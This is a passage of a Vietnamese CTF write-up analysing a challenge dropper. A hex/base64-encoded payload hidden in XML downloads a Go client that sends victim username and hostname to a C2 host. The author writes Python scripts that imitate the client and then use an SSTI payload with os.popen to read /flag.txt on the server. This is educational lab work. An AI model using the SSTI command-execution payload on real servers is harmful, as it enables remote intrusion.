+		data-flex-basis="767px"
+	
+></p>
+<h3 id="unzip--check">Unzip &amp; check</h3>
+<p>Từ đây mình tiến hành giải nén &ldquo;file zip&rdquo; này ra và kiểm tra xem nó có gì lạ hay không (Chú ý đến các file xml xuất hiện trong bản giải nén này)</p>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-10.png"
+	width="1217"
+	height="499"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-10_hu6bfe9cf64fe86a1f6bdb52383490fabf_392289_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-10_hu6bfe9cf64fe86a1f6bdb52383490fabf_392289_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="243"
+		data-flex-basis="585px"
+	
+></p>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-12.png"
+	width="1708"
+	height="663"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-12_huecca0abbe4fc9ffc679cad313214557d_620070_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-12_huecca0abbe4fc9ffc679cad313214557d_620070_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="257"
+		data-flex-basis="618px"
+	
+></p>
+<p>Qua việc nhìn bằng mắt thường thì cũng thấy rằng đoạn XML này thực ra được mã hóa từ hexa và base64, mình sẽ tiến hành decode nó</p>
+<h3 id="decode">Decode</h3>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-13.png"
+	width="654"
+	height="525"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-13_hu75ebdd7bceeaa0207ac58a1c30fa23d5_96247_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-13_hu75ebdd7bceeaa0207ac58a1c30fa23d5_96247_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Decode hexa"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="124"
+		data-flex-basis="298px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">server:
+</span></span><span class="line"><span class="cl">   host: http://REPLACE_HOST_HERE
+</span></span><span class="line"><span class="cl">   secret: SecR3TtOKen
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nhìn qua thì đây là giống như 1 chỉ dẫn về host và mật khẩu của server để file này tương tác với nó thì phải</p>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-14.png"
+	width="1024"
+	height="713"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-14_hu9bfcc4d842cdb72a1f4fe858c1ef5384_440996_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-14_hu9bfcc4d842cdb72a1f4fe858c1ef5384_440996_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Decode Base64"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="143"
+		data-flex-basis="344px"
+	
+></p>
+<p>Dựa vào header <code>MZ</code> của đoạn base64 được decode kia thì có thể đoán được đây là 1 file <code>exe</code> trên Windows, export về và load vào IDA để kiểm tra xem nó có gì nào</p>
+<ul>
+<li>main</li>
+</ul>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-4.png"
+	width="759"
+	height="300"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-4_huaa842713bee10d83a4801aed15ba7220_93907_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-4_huaa842713bee10d83a4801aed15ba7220_93907_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Hàm main"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="253"
+		data-flex-basis="607px"
+	
+></p>
+<p>Nhìn kỹ 1 chút thì ở đây có hàm <code>downloadFile</code> với tham số là <code>REPLACE_HOST_HERE</code>, kiểm tra trực tiếp nó thì thấy được đoạn phương thức GET client.exe từ <code>/static</code> về</p>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-15.png"
+	width="918"
+	height="462"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-15_hu8e0d8c58e0fd1dcd05a4cbd8de2da655_112092_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-15_hu8e0d8c58e0fd1dcd05a4cbd8de2da655_112092_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="476px"
+	
+></p>
+<p>Với host mặc định của challenge thì chắc chắn sẽ lấy file từ <code>http://103.97.125.53:31040/static/client.exe​</code> truy cập vào đó và lấy file về, có thể đây là phương thức giao tiếp giữa người bị hại và server.</p>
+<h3 id="clientexe">client.exe</h3>
+<p>Đây là 1 file được viết bởi Golang, dạo gần đây mình thấy các challenge kiểu tương tác giữa client và server được dùng rất nhiều</p>
+<p>Load file vào IDA</p>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-16.png"
+	width="963"
+	height="543"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-16_hud77379b8af9506a4348133a73bc4742b_149276_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-16_hud77379b8af9506a4348133a73bc4742b_149276_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="177"
+		data-flex-basis="425px"
+	
+></p>
+<p>Dựa vào cách đặt tên thì có thể đoán được:</p>
+<ul>
+<li><code>main_getSystemInfo()</code> là hàm lấy các thông tin của máy nạn nhân</li>
+<li><code>main_sendPostRequest()</code> là hàm gửi đi các thông tin lấy được (client.exe sẽ tương tác với host)</li>
+<li>Còn về hàm <code>main_loadAllConfigs()</code> thì mình chưa hình dung ra được nó sẽ làm gì, có thể là liên quan đến việc config nào đó cho phía server hiểu được và lúc này thì có thể để ý đến đoạn chỉ dẫn về <code>host</code> và <code>secret</code> ban nãy</li>
+</ul>
+<ul>
+<li>main_loadAllConfigs():</li>
+</ul>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-17.png"
+	width="817"
+	height="749"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-17_huee2c6afbfb1db61f6abeb3a2793fadae_391190_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-17_huee2c6afbfb1db61f6abeb3a2793fadae_391190_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="109"
+		data-flex-basis="261px"
+	
+></p>
+<p>Khi để file config cùng trong thư mục với client.exe thì có thấy lỗi về ini &ndash;&gt; đổi thành <code>config.ini</code> và chuyển <code>host: http://103.97.125.53:31040</code></p>
+<h3 id="bắt-tương-tác-giữa-client-với-host-thông-qua-wireshark">Bắt tương tác giữa client với host thông qua Wireshark</h3>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-18.png"
+	width="664"
+	height="83"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-18_hu948b07a42b76b9862b5d3e35f5fa4db7_34176_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-18_hu948b07a42b76b9862b5d3e35f5fa4db7_34176_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="800"
+		data-flex-basis="1920px"
+	
+></p>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-19.png"
+	width="916"
+	height="437"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-19_hu89ab33875556a08176677ec81e0be0cd_222425_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-19_hu89ab33875556a08176677ec81e0be0cd_222425_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="209"
+		data-flex-basis="503px"
+	
+></p>
+<p>Từ đây có thể thấy client gửi các thông tin về <code>username</code>, <code>hostname</code> từ phía client đồng thời cùng với <code>secret: SecR3TtOken</code> lên server và được trả về <code>Logged username hostname</code></p>
+<p>Từ đây có thể viết 1 đoạn script mô phỏng việc gửi thông tin và nhận thông tin giữa client và server như sau:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">request</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://103.97.125.53:31040&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">header</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Go-http-server/1.1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.7&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/json&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Secret&#34;</span><span class="p">:</span> <span class="s2">&#34;SecR3Ttoken&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;SPID3R-MSI\Spid3r&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;hostname&#34;</span><span class="p">:</span> <span class="s2">&#34;Spider-msi&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Logged SPID3R-MSI\Spid3r Spid3r-msi</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Vậy thì đã giải quyết xong việc kết nối &ldquo;nhân tạo&rdquo; giữa client và server thông qua đoạn script trên</p>
+<blockquote>
+<p>dựa vào hint mà nếu không đưa ra thì không ai biết mà giải nổi đến từ tác giả <code>FLAG nằm trên host, tìm cách kết nối đúng và exploit</code></p>
+</blockquote>
+<p>thì bây giờ việc quan trọng nhất sẽ là đi tìm lỗi trên server để dựa vào việc khai thác nó và lấy flag</p>
+<p><img src="/p/cookie-arena-2-reverse-engineering/image-20.png"
+	width="846"
+	height="649"
+	srcset="/p/cookie-arena-2-reverse-engineering/image-20_hu6e34c88260aeecc1f4fd81e30015f6dd_402296_480x0_resize_box_3.png 480w, /p/cookie-arena-2-reverse-engineering/image-20_hu6e34c88260aeecc1f4fd81e30015f6dd_402296_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="130"
+		data-flex-basis="312px"
+	
+></p>
+<p>May thật, thử phát đầu thì dính đét lỗi SSTI luôn, việc cuối cùng chỉ là viết payload để get flag trực tiếp từ server thôi</p>
+<p>Script giải:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">request</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://103.97.125.53:31040&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">header</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Go-http-server/1.1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.7&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/json&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Secret&#34;</span><span class="p">:</span> <span class="s2">&#34;SecR3Ttoken&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;{{url_for.__globals__.os.__dict__.popen(&#39;cat /flag.txt).read()}}&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;hostname&#34;</span><span class="p">:</span> <span class="s2">&#34;Spider-msi&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Logged CHH{ExtR@Ct_m4CRo_aNd_h@Ck_C2c_d791e9a6f418993651267fbae56e3c46} Spid3r-msi</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/reverse/">reverse</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed By Spid3r</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/backdoor-ctf-2023-reverse-engineering/">
+        
+        
+            <div class="article-image">
+                <img src="/p/backdoor-ctf-2023-reverse-engineering/featured.86b1b3b583da13a095d641e51cb99e82_hu1633d773772b68a8a46d663a367faa24_195597_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Backdoor CTF 2023 | Reverse Engineering"
+                        
+                        data-hash="md5-hrGztYPaE6CV1kHlHLmegg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Backdoor CTF 2023 | Reverse Engineering</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/buckeye-ctf-2023-writeups/">
+        
+        
+            <div class="article-image">
+                <img src="/p/buckeye-ctf-2023-writeups/featured-image.27a5aed6c10513bcfb9164509564e319_hu5fad3dab004c0aa4880db40f68baffb0_36302_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Buckeye CTF 2023 | Writeups"
+                        
+                        data-hash="md5-J6Wu1sEFE7z7kWRQlWTjGQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Buckeye CTF 2023 | Writeups</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/sekaictf-2023-reverse-engineering/">
+        
+        
+            <div class="article-image">
+                <img src="/p/sekaictf-2023-reverse-engineering/featured-image.77f31e339d1dd761644fd8c209773b4b_hu53ff5d738f6f6b8e65c2845372b95fb7_671573_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post SekaiCTF 2023 | Reverse Engineering"
+                        
+                        data-hash="md5-d/MeM50d12FkT9jCCXc7Sw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SekaiCTF 2023 | Reverse Engineering</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/umdctf-2023-digital-forensics/">
+        
+        
+            <div class="article-image">
+                <img src="/p/umdctf-2023-digital-forensics/featured.2a8aa883bb482dd1d5f4b41b8414809b_hu521915a03207d3ded912c6c781e96e24_122168_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post UMDCTF 2023 | Digital Forensics"
+                        
+                        data-hash="md5-Koqog7tILdHV9LQbhBSAmw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">UMDCTF 2023 | Digital Forensics</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/corctf-2022-reverse-engineering/">
+        
+        
+            <div class="article-image">
+                <img src="/p/corctf-2022-reverse-engineering/featured-image.2fd80d1927dfc258bd0f81de82ee6e33_huc527355a429b7d0660ac9e16fd98331c_24593_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post CorCTF 2022 | Reverse Engineering"
+                        
+                        data-hash="md5-L9gNGSffwli9D4Hegu5uMw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CorCTF 2022 | Reverse Engineering</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script
+    src="https://giscus.app/client.js"
+    data-repo=""
+    data-repo-id=""
+    data-category=""
+    data-category-id=""
+    data-mapping="title"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="light"
+    data-lang="en"
+    crossorigin="anonymous"
+    async
+></script>
+<script>
+    function setGiscusTheme(theme) {
+        let giscus = document.querySelector("iframe.giscus-frame");
+        if (giscus) {
+            giscus.contentWindow.postMessage(
+                {
+                    giscus: {
+                        setConfig: {
+                            theme: theme,
+                        },
+                    },
+                },
+                "https://giscus.app"
+            );
+        }
+    }
+
+    (function () {
+        addEventListener("message", (e) => {
+            if (event.origin !== "https://giscus.app") return;
+            handler();
+        });
+        window.addEventListener("onColorSchemeChange", handler);
+
+        function handler() {
+            if (document.documentElement.dataset.scheme === "light") {
+                setGiscusTheme('light');
+            } else {
+                setGiscusTheme('dark_dimmed');
+            }
+        }
+    })();
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy;  2021 -  2024 Spid3r&#39;s Blog
+    </section>
+</footer>
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
